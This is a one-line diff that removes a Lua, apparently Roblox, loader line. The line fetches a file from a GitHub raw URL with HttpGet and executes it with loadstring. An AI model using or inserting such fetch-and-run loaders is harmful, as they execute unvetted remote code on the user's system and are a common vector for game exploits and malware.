@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/zerotopflash/paradox/main/README.md'),true))()
